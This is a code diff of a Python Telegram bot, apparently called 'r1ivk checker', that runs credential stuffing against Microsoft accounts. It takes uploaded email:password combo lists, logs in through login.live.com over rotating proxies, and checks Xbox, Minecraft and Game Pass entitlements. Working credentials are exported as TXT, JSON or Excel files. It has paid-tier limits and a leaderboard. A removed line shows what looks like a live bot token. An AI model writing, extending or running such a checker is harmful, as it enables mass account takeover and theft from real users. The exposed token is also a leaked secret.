@@ -10,30 +10,38 @@ import io
 import json
 import time
 import sqlite3
+import logging
 import zipfile
 import threading
 import requests
 import urllib3
 from urllib.parse import urlparse, parse_qs
-from datetime import datetime, timedelta
-from collections import defaultdict
+from datetime import datetime
 import telebot
 from telebot import types
 
 urllib3.disable_warnings()
 
+# =================== LOGGER ===================
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s | %(levelname)s | %(message)s"
+)
+log = logging.getLogger("r1ivk")
+
 # =================== CONFIG ===================
-BOT_TOKEN   = "YOUR_BOT_TOKEN_HERE"       # <-- 8896382526:AAEySaJWfg6pQpoRuSu8zQaG50uJ_Jf0obg
-OWNER_ID    = 123456789                   # <-- 6266959915
-ADMIN_IDS   = []                          # مشرفين إضافيين
+# Read from environment for safety; fallback to placeholder
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "PUT_YOUR_TOKEN_HERE")
+OWNER_ID  = int(os.environ.get("OWNER_ID", "6266959915"))
+ADMIN_IDS = []                              # extra admin chat ids
 RESULTS_DIR = "XBOX_RESULT"
 DB_FILE     = "r1ivk_checker.db"
 
-REQUEST_TIMEOUT = 25
-MAX_THREADS     = 50
-FREE_DAILY_LIMIT  = 100          # حد المستخدم العادي يومياً
-PRO_DAILY_LIMIT   = 10000        # حد Pro يومياً
-VIP_DAILY_LIMIT   = 999999       # VIP غير محدود عملياً
+REQUEST_TIMEOUT  = 25
+MAX_THREADS      = 50
+FREE_DAILY_LIMIT = 100
+PRO_DAILY_LIMIT  = 10000
+VIP_DAILY_LIMIT  = 999999
 
 os.makedirs(RESULTS_DIR, exist_ok=True)
 
@@ -95,7 +103,8 @@ def db_get_user(chat_id, username=None):
         today = datetime.utcnow().strftime("%Y-%m-%d")
         if not row:
             cur.execute("""INSERT INTO users
-                (chat_id, username, role, daily_used, last_reset, total_hits, total_checks, joined)
+                (chat_id, username, role, daily_used, last_reset,
+                 total_hits, total_checks, joined)
                 VALUES (?, ?, 'free', 0, ?, 0, 0, ?)""",
                 (chat_id, username or "", today, datetime.utcnow().isoformat()))
             DB.commit()
@@ -103,7 +112,8 @@ def db_get_user(chat_id, username=None):
             row = cur.fetchone()
         else:
             if row[4] != today:
-                cur.execute("UPDATE users SET daily_used=0, last_reset=? WHERE chat_id=?", (today, chat_id))
+                cur.execute("UPDATE users SET daily_used=0, last_reset=? WHERE chat_id=?",
+                            (today, chat_id))
                 DB.commit()
                 cur.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
                 row = cur.fetchone()
@@ -116,7 +126,9 @@ def db_get_user(chat_id, username=None):
 def db_add_usage(chat_id, checks=0, hits=0):
     with DB_LOCK:
         cur = DB.cursor()
-        cur.execute("UPDATE users SET daily_used=daily_used+?, total_checks=total_checks+?, total_hits=total_hits+? WHERE chat_id=?",
+        cur.execute("""UPDATE users SET daily_used=daily_used+?,
+                       total_checks=total_checks+?, total_hits=total_hits+?
+                       WHERE chat_id=?""",
                     (checks, checks, hits, chat_id))
         DB.commit()
 
@@ -130,7 +142,8 @@ def db_save_session(s):
     with DB_LOCK:
         cur = DB.cursor()
         cur.execute("""INSERT INTO sessions
-            (chat_id, started, finished, total, checked, hits, gamepass, minecraft, gscore, bad, twofa, errors)
+            (chat_id, started, finished, total, checked, hits, gamepass,
+             minecraft, gscore, bad, twofa, errors)
             VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
             (s["chat_id"], s["started_iso"], datetime.utcnow().isoformat(),
              s["total"], s["checked"], s["hits"], s["gamepass"], s["minecraft"],
@@ -147,13 +160,14 @@ def db_audit(chat_id, action):
 def db_leaderboard():
     with DB_LOCK:
         cur = DB.cursor()
-        cur.execute("SELECT username, chat_id, total_hits, total_checks, role FROM users ORDER BY total_hits DESC LIMIT 10")
+        cur.execute("""SELECT username, chat_id, total_hits, total_checks, role
+                       FROM users ORDER BY total_hits DESC LIMIT 10""")
         return cur.fetchall()
 
 def daily_limit_for(role):
     if role == "vip":   return VIP_DAILY_LIMIT
     if role == "pro":   return PRO_DAILY_LIMIT
-    if role in ("admin","owner"): return VIP_DAILY_LIMIT
+    if role in ("admin", "owner"): return VIP_DAILY_LIMIT
     return FREE_DAILY_LIMIT
 
 def is_admin(chat_id):
@@ -164,16 +178,14 @@ def get_role(chat_id):
     u = db_get_user(chat_id)
     return u["role"]
 
-# =================== PROXY MANAGER ===================
+# =================== PROXY POOL ===================
 class ProxyPool:
     def __init__(self, proxies=None):
         self.proxies = proxies or []
         self.idx = 0
         self.lock = threading.Lock()
-
     def get(self):
-        if not self.proxies:
-            return None
+        if not self.proxies: return None
         with self.lock:
             p = self.proxies[self.idx % len(self.proxies)]
             self.idx += 1
@@ -191,21 +203,15 @@ HIT_FILES = {
 
 def new_session(chat_id):
     return {
-        "chat_id": chat_id,
-        "is_running": False,
+        "chat_id": chat_id, "is_running": False,
         "checked": 0, "total": 0,
         "hits": 0, "bad": 0, "twofa": 0, "errors": 0,
         "gamepass": 0, "minecraft": 0, "gscore": 0,
-        "start_time": 0,
-        "started_iso": "",
-        "hits_buffer": [],
-        "last_update": 0,
-        "status_msg_id": None,
+        "start_time": 0, "started_iso": "",
+        "hits_buffer": [], "last_update": 0, "status_msg_id": None,
         "lock": threading.Lock(),
-        "stop_flag": False,
-        "paused": False,
-        "proxy_pool": None,
-        "notified_ultimate": False,
+        "stop_flag": False, "paused": False,
+        "proxy_pool": None, "notified_ultimate": False,
     }
 
 def get_session(chat_id):
@@ -243,7 +249,6 @@ def extract_url_post(text):
 COMBO_RE = re.compile(r'^([^\s:]+@[^\s:]+|[^\s:]+)[:\|](.+)$')
 
 def parse_combo(line):
-    """يحاول استخراج email:pass من عدة صيغ"""
     line = line.strip()
     if not line or line.startswith("#"):
         return None
@@ -261,11 +266,9 @@ def dedupe_combos(lines):
     out = []
     for l in lines:
         c = parse_combo(l)
-        if not c:
-            continue
+        if not c: continue
         email = c.split(":")[0].lower()
-        if email in seen:
-            continue
+        if email in seen: continue
         seen.add(email)
         out.append(c)
     return out
@@ -288,8 +291,7 @@ def check_account(combo, chat_id):
     password = ':'.join(parts[1:]).strip()
 
     for attempt in range(2):
-        if s["stop_flag"]:
-            return
+        if s["stop_flag"]: return
 
         session = requests.Session()
         session.verify = False
@@ -318,17 +320,18 @@ def check_account(combo, chat_id):
             if not sftag or not url_post:
                 with s["lock"]:
                     s["bad"] += 1; s["checked"] += 1
-                session.close()
-                return
+                session.close(); return
 
             login_data = {
                 'login': email, 'loginfmt': email, 'passwd': password,
-                'PPFT': sftag, 'type': '11', 'NewUser': '1', 'LoginOptions': '3', 'i19': '0',
+                'PPFT': sftag, 'type': '11', 'NewUser': '1',
+                'LoginOptions': '3', 'i19': '0',
             }
             headers = {'Content-Type': 'application/x-www-form-urlencoded',
                        'Referer': sftag_url, 'Origin': 'https://login.live.com'}
             login_req = session.post(url_post, data=login_data, headers=headers,
-                                     allow_redirects=True, timeout=REQUEST_TIMEOUT, proxies=proxy)
+                                     allow_redirects=True, timeout=REQUEST_TIMEOUT,
+                                     proxies=proxy)
 
             ms_token = None
             login_text = login_req.text.lower()
@@ -395,7 +398,8 @@ def check_account(combo, chat_id):
             has_gp, has_mc, gp_type, mc_ent_text = False, False, "", ""
             try:
                 xsts_mc_payload = {"Properties": {"SandboxId": "RETAIL", "UserTokens": [xb_token]},
-                                   "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}
+                                   "RelyingParty": "rp://api.minecraftservices.com/",
+                                   "TokenType": "JWT"}
                 xsts_mc_req = session.post('https://xsts.auth.xboxlive.com/xsts/authorize',
                                            json=xsts_mc_payload, headers=xb_headers,
                                            timeout=REQUEST_TIMEOUT, proxies=proxy)
@@ -409,9 +413,10 @@ def check_account(combo, chat_id):
                     if mc_auth.status_code == 200:
                         mt = mc_auth.json().get('access_token')
                         if mt:
-                            ent = session.get('https://api.minecraftservices.com/entitlements/mcstore',
-                                              headers={'Authorization': f'Bearer {mt}'},
-                                              timeout=REQUEST_TIMEOUT, proxies=proxy)
+                            ent = session.get(
+                                'https://api.minecraftservices.com/entitlements/mcstore',
+                                headers={'Authorization': f'Bearer {mt}'},
+                                timeout=REQUEST_TIMEOUT, proxies=proxy)
                             if ent.status_code == 200:
                                 mc_ent_text = ent.text
             except: pass
@@ -440,7 +445,8 @@ def check_account(combo, chat_id):
                     if gp_type == "Game Pass Ultimate" and not s["notified_ultimate"]:
                         s["notified_ultimate"] = True
                         try:
-                            bot.send_message(s["chat_id"],
+                            bot.send_message(
+                                s["chat_id"],
                                 f"🔥🔥 *ULTIMATE HIT!* 🔥🔥\n```\n{hit_content}\n```")
                         except: pass
                 elif has_mc:
@@ -506,7 +512,6 @@ def live_scanner(chat_id, combos, threads=30):
     db_save_session(s)
     db_add_usage(chat_id, checks=s["checked"], hits=s["hits"])
 
-    # ملخص نهائي
     try:
         summary = (
             f"🏁 *r1ivk CHECKER — FINAL REPORT*\n"
@@ -520,7 +525,7 @@ def live_scanner(chat_id, combos, threads=30):
             f"🔒 2FA: `{s['twofa']}`\n"
             f"⚠️ Errors: `{s['errors']}`\n"
             f"━━━━━━━━━━━━━━━━━━━━━━\n"
-            f"استخدم /hits لاستلام الملفات 📤"
+            f"Use /hits to receive files 📤"
         )
         bot.send_message(chat_id, summary)
     except: pass
@@ -566,7 +571,7 @@ def render_status(chat_id, final=False):
             s["status_msg_id"] = m.message_id
     except: pass
 
-# =================== EXPORT HELPERS ===================
+# =================== EXPORT ===================
 def export_txt(s):
     buf = io.StringIO()
     for t, c in s["hits_buffer"]:
@@ -585,12 +590,13 @@ def export_xlsx(s):
     wb = Workbook()
     ws = wb.active
     ws.title = "Hits"
-    ws.append(["Type","Email","Password","Gamertag","Gamerscore","Minecraft","Game Pass"])
+    ws.append(["Type", "Email", "Password", "Gamertag",
+               "Gamerscore", "Minecraft", "Game Pass"])
     for t, c in s["hits_buffer"]:
         d = dict(re.findall(r'(.+?): (.+)', c))
         ws.append([
-            t, d.get("Email",""), d.get("Password",""), d.get("Gamertag",""),
-            d.get("Gamerscore",""), d.get("Minecraft",""), d.get("Game Pass",""),
+            t, d.get("Email", ""), d.get("Password", ""), d.get("Gamertag", ""),
+            d.get("Gamerscore", ""), d.get("Minecraft", ""), d.get("Game Pass", ""),
         ])
     bio = io.BytesIO()
     wb.save(bio); bio.seek(0)
@@ -606,16 +612,17 @@ def export_zip(s):
     bio.seek(0)
     return bio.read()
 
-# =================== BOT HANDLERS ===================
+# =================== KEYBOARDS ===================
 def main_menu_kb(chat_id):
     kb = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
-    kb.add("📁 فحص ملف", "📝 فحص كومبو")
-    kb.add("📊 إحصائياتي", "🏆 المتصدرين")
-    kb.add("📤 استلام الهيتس", "ℹ️ مساعدة")
+    kb.add("📁 Scan File", "📝 Single Combo")
+    kb.add("📊 My Stats", "🏆 Leaderboard")
+    kb.add("📤 Get Hits", "ℹ️ Help")
     if is_admin(chat_id):
-        kb.add("👑 لوحة الأدمن")
+        kb.add("👑 Admin Panel")
     return kb
 
+# =================== HANDLERS ===================
 @bot.message_handler(commands=['start'])
 def cmd_start(msg):
     chat_id = msg.chat.id
@@ -628,18 +635,18 @@ def cmd_start(msg):
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👤 Username: @{msg.from_user.username or 'N/A'}\n"
         f"🎭 Role: `{role.upper()}`\n"
-        f"📊 Daily Used: `{u['daily_used']}/{limit if limit<999999 else '∞'}`\n"
+        f"📊 Daily Used: `{u['daily_used']}/{limit if limit < 999999 else '∞'}`\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
-        f"🔹 *الأوامر:*\n"
-        f"`/check email:pass` — فحص كومبو\n"
-        f"`/file` — ارفع ملف كومبو (Live Scan)\n"
-        f"`/stop` — إيقاف\n"
-        f"`/pause` `/resume` — إيقاف/متابعة\n"
-        f"`/stats` — إحصائياتك\n"
-        f"`/leaderboard` — المتصدرين\n"
-        f"`/hits` — استلام كل النتائج\n"
-        f"`/export` — ZIP (TXT+JSON+Excel)\n"
-        f"`/reset` — تصفير الجلسة\n"
+        f"🔹 *Commands:*\n"
+        f"`/check email:pass` — Check a single combo\n"
+        f"`/file` — Upload combo file (Live Scan)\n"
+        f"`/stop` — Stop scanning\n"
+        f"`/pause` `/resume` — Pause / Resume\n"
+        f"`/stats` — Your statistics\n"
+        f"`/leaderboard` — Top 10 users\n"
+        f"`/hits` — Receive hits files\n"
+        f"`/export` — ZIP (TXT + JSON + Excel)\n"
+        f"`/reset` — Reset session\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"👑 Owner: r1ivk"
     )
@@ -649,15 +656,32 @@ def cmd_start(msg):
 def cmd_help(msg):
     cmd_start(msg)
 
-@bot.message_handler(func=lambda m: m.text == "ℹ️ مساعدة")
-def help_btn(msg): cmd_start(msg)
+@bot.message_handler(func=lambda m: m.text == "ℹ️ Help")
+def help_btn(msg):
+    cmd_start(msg)
 
-@bot.message_handler(func=lambda m: m.text in ("📁 فحص ملف","📝 فحص كومبو"))
+@bot.message_handler(func=lambda m: m.text in ("📁 Scan File", "📝 Single Combo"))
 def guide(msg):
-    if msg.text == "📁 فحص ملف":
-        bot.reply_to(msg, "📁 أرسل ملف `.txt` فيه كومبو (سطر لكل حساب)")
+    if msg.text == "📁 Scan File":
+        bot.reply_to(msg, "📁 Send a `.txt` combo file (one account per line)")
     else:
-        bot.reply_to(msg, "📝 أرسل: `/check email:pass`")
+        bot.reply_to(msg, "📝 Send: `/check email:pass`")
+
+@bot.message_handler(func=lambda m: m.text == "📊 My Stats")
+def btn_stats(msg):
+    cmd_stats(msg)
+
+@bot.message_handler(func=lambda m: m.text == "🏆 Leaderboard")
+def btn_lb(msg):
+    cmd_leaderboard(msg)
+
+@bot.message_handler(func=lambda m: m.text == "📤 Get Hits")
+def btn_hits(msg):
+    cmd_hits(msg)
+
+@bot.message_handler(func=lambda m: m.text == "👑 Admin Panel")
+def btn_admin(msg):
+    cmd_admin(msg)
 
 @bot.message_handler(commands=['check'])
 def cmd_check(msg):
@@ -666,16 +690,16 @@ def cmd_check(msg):
     role = get_role(chat_id)
     limit = daily_limit_for(role)
     if u["daily_used"] >= limit and not is_admin(chat_id):
-        bot.reply_to(msg, f"⛔ وصلت الحد اليومي ({limit}). رقّي حسابك أو انتظر لبكرا.")
+        bot.reply_to(msg, f"⛔ Daily limit reached ({limit}). Upgrade or wait until tomorrow.")
         return
 
     args = msg.text.split(maxsplit=1)
     if len(args) < 2:
-        bot.reply_to(msg, "❌ استخدم: `/check email:pass`")
+        bot.reply_to(msg, "❌ Usage: `/check email:pass`")
         return
     combo = parse_combo(args[1])
     if not combo:
-        bot.reply_to(msg, "❌ صيغة غير صحيحة")
+        bot.reply_to(msg, "❌ Invalid format")
         return
 
     s = get_session(chat_id)
@@ -690,7 +714,7 @@ def cmd_check(msg):
 
 @bot.message_handler(commands=['file'])
 def cmd_file(msg):
-    bot.reply_to(msg, "📁 أرسل الآن ملف الكومبو (.txt)")
+    bot.reply_to(msg, "📁 Send the combo file (.txt) now")
 
 @bot.message_handler(content_types=['document'])
 def handle_doc(msg):
@@ -699,26 +723,26 @@ def handle_doc(msg):
     role = get_role(chat_id)
     limit = daily_limit_for(role)
 
-    if not msg.document.file_name.lower().endswith(('.txt','.csv')):
-        bot.reply_to(msg, "❌ يجب أن يكون الملف نصي")
+    if not msg.document.file_name.lower().endswith(('.txt', '.csv')):
+        bot.reply_to(msg, "❌ File must be text (.txt or .csv)")
         return
 
     try:
         fi = bot.get_file(msg.document.file_id)
         data = bot.download_file(fi.file_path).decode('utf-8', errors='ignore')
     except Exception as e:
-        bot.reply_to(msg, f"❌ فشل تحميل الملف: {e}")
+        bot.reply_to(msg, f"❌ Failed to download file: {e}")
         return
 
     combos = dedupe_combos(data.splitlines())
     if not combos:
-        bot.reply_to(msg, "❌ الملف فارغ/غير صالح")
+        bot.reply_to(msg, "❌ File is empty or invalid")
         return
 
     allowed = limit - u["daily_used"]
     if not is_admin(chat_id) and len(combos) > allowed:
         combos = combos[:allowed]
-        bot.reply_to(msg, f"⚠️ تم اقتصاص الملف للحد المسموح ({allowed}).")
+        bot.reply_to(msg, f"⚠️ File trimmed to daily limit ({allowed}).")
 
     s = get_session(chat_id)
     s.update({"stop_flag": False, "paused": False, "is_running": True,
@@ -729,4 +753,39 @@ def handle_doc(msg):
               "gscore": 0, "hits_buffer": [], "status_msg_id": None,
               "notified_ultimate": False})
 
-    bot.reply_to(msg, f"🚀 *بدء الفحص* —
+    bot.reply_to(msg, f"🚀 *Scan started* — `{len(combos)}` combos\n"
+                      f"Use /stop to cancel, /pause to pause.")
+
+    threading.Thread(target=live_scanner,
+                     args=(chat_id, combos, MAX_THREADS),
+                     daemon=True).start()
+
+
+@bot.message_handler(commands=['stop'])
+def cmd_stop(msg):
+    chat_id = msg.chat.id
+    s = get_session(chat_id)
+    if not s["is_running"]:
+        bot.reply_to(msg, "⚠️ No scan running.")
+        return
+    s["stop_flag"] = True
+    s["is_running"] = False
+    db_audit(chat_id, "stop")
+    bot.reply_to(msg, "🛑 *Scan stopped.*")
+
+@bot.message_handler(commands=['pause'])
+def cmd_pause(msg):
+    chat_id = msg.chat.id
+    s = get_session(chat_id)
+    if not s["is_running"]:
+        bot.reply_to(msg, "⚠️ No scan running.")
+        return
+    s["paused"] = True
+    bot.reply_to(msg, "⏸ *Paused.*")
+
+@bot.message_handler(commands=['resume'])
+def cmd_resume(msg):
+    chat_id = msg.chat.id
+    s = get_session(chat_id)
+    if not s["is_running"]:
+        bot.reply_to(msg, "⚠️ No scan running
